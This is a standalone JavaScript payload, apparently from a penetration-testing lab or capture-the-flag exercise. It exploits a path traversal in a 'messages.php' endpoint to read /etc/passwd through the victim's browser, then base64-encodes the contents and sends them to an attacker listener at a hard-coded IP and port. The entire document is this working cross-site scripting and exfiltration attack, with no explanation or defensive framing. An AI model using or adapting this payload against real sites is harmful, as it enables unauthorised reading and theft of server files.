<script>
    var url = "messages.php?file=../../../../../../../etc/passwd"
    var attacker = "http://10.10.16.16:9001/exfil"
    var xhr = new XMLHttpRequest()
    xhr.onreadystatechange = function () {
      if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
      }
    }
    xhr.open("GET", url, true)
    xhr.send(null)
</script>